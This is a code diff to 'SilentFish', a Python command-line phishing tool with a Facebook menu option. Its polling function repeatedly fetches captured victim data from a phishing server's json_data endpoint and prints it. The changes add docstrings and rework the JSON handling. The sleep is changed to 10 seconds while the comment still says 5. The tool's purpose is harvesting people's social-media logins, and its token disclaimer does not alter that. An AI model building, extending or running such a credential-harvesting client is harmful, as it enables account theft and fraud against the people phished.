@@ -11,15 +11,12 @@ DEVELOPER_INFO = "Developed by: Yamman Butt"
 # Clean and Clear ASCII Art Logo
 SILENTFISH_LOGO = f"""
 {Fore.CYAN}
-
 #     _____  _  _               _    ______  _       _     
 #    / ____|(_)| |             | |  |  ____|(_)     | |    
 #   | (___   _ | |  ___  _ __  | |_ | |__    _  ___ | |__  
 #    \___ \ | || | / _ \| '_ \ | __||  __|  | |/ __|| '_ \ 
 #    ____) || || ||  __/| | | || |_ | |     | |\__ \| | | |
 #   |_____/ |_||_| \___||_| |_| \__||_|     |_||___/|_| |_|
-#                                                          
-
 {Style.RESET_ALL}
 """
 
@@ -32,6 +29,7 @@ and may result in legal consequences. Use responsibly.{Style.RESET_ALL}
 
 # Styled Banner
 def show_banner():
+    """Displays the tool banner."""
     os.system("clear")
     print(SILENTFISH_LOGO)
     print(Style.BRIGHT + Fore.GREEN + "=" * 70)
@@ -40,39 +38,46 @@ def show_banner():
 
 # Styled Disclaimer
 def show_disclaimer():
+    """Displays the tool disclaimer."""
     print(DISCLAIMER)
 
 # Menu Display
 def show_menu():
+    """Displays the main menu."""
     print(Style.BRIGHT + Fore.GREEN + "\n[ MAIN MENU ]" + Style.RESET_ALL)
     print(Fore.MAGENTA + "1. Facebook")
     print("2. Exit" + Style.RESET_ALL)
 
 # Polling Functionality for Live Data
 def start_polling():
-    print(Fore.YELLOW + f"\n URL: {PHISHING_URL}" + Style.RESET_ALL)
-    print(Fore.YELLOW + "\nlive data... Press Ctrl+C to stop." + Style.RESET_ALL)
+    """live data from testers."""
+    print(Fore.YELLOW + f"\nURL: {PHISHING_URL}" + Style.RESET_ALL)
+    print(Fore.YELLOW + "\nFetching live data... Press Ctrl+C to stop." + Style.RESET_ALL)
     
     try:
         while True:
             # Fetch live data from the endpoint
             headers = {"User-Agent": "Mozilla/5.0"}
             response = requests.get(f"{PHISHING_URL}/json_data", headers=headers)
-
+            
+            # Handle API response
             if response.status_code == 200:
-                data = response.json()
-                if data.get("login_status") == "logged_in":  # Replace with your API's login condition
-                    print(Fore.GREEN + f"User logged in! Data: {data}" + Style.RESET_ALL)
-                else:
-                    print(Fore.CYAN + "No login detected. Waiting..." + Style.RESET_ALL)
+                try:
+                    data = response.json()
+                    print(Fore.GREEN + f"Received Data: {data}" + Style.RESET_ALL)
+                except ValueError:
+                    print(Fore.RED + "Error: Received invalid JSON response." + Style.RESET_ALL)
             else:
                 print(Fore.RED + f"Failed to fetch data. HTTP Status: {response.status_code}" + Style.RESET_ALL)
-            time.sleep(5)  # Wait 5 seconds before polling again
+            
+            # Wait 5 seconds before polling again
+            time.sleep(10)
     except KeyboardInterrupt:
-        print(Fore.GREEN + "\nStopping and exiting to the main menu." + Style.RESET_ALL)
+        print(Fore.GREEN + "\nStopped. Returning to the main menu." + Style.RESET_ALL)
 
 # Exit Program
 def exit_tool():
+    """Exits the tool."""
     print(Fore.GREEN + "\nExiting the tool. Stay safe and ethical!" + Style.RESET_ALL)
     time.sleep(1)
     os.system("clear")
@@ -80,6 +85,7 @@ def exit_tool():
 
 # Main Function
 def main():
+    """Main entry point of the tool."""
     show_banner()
     show_disclaimer()
 
